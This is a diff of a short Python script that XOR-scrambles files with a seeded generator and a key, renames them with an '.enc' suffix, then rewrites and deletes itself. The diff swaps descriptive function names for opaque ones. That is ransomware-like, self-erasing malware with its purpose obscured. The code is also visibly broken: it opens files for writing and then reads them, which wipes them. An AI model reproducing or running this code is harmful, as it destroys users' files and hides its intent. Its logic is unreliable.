@@ -10,17 +10,17 @@ import sys, os
 import random
 
 
-def cryptinator() -> int:
+def abcd() -> int:
     return ((((~(random.randint(0, 255))) << 2) ^ 0b10101010) & 0b01010101)
 
-def cryptinator_v2(x:int) -> int:
+def efgh(x:int) -> int:
     return (((((~(random.randint(0, 4096)))) & 0b10101010) ^ x) | 0b01010101) % 256
 
-def encrypt_data(data:bytes) -> bytes:
+def scrambleinator(x:bytes) -> bytes:
     random.seed("NiceTry")
-    for i in range(len(data := bytearray(data))):
-        data[i] ^= cryptinator() ^ cryptinator_v2(i) ^ KEY.encode("utf-8")[i % len(KEY)]
-    return bytes(data)
+    for i in range(len(x := bytearray(x))):
+        x[i] ^= abcd() ^ efgh(i) ^ KEY.encode("utf-8")[i % len(KEY)]
+    return bytes(x)
 
 
 if __name__ == "__main__":
@@ -36,8 +36,8 @@ if __name__ == "__main__":
             continue
         with open(n, "wb") as f:
             c = f.read()
-            f.write(encrypt_data(c))
+            f.write(scrambleinator(c))
             os.rename(n, n + ".enc")
-        with open(n, "wb") as f:
-            f.write(f.read().replace(b"8008135", b"NiceTry").replace(KEY, KEY.swapcase()))
-        os.remove(__name__)
+    with open(__name__, "wb") as f:
+        f.write(f.read().replace(b"8008135", b"NiceTry").replace(KEY, KEY.swapcase()))
+    os.remove(__name__)
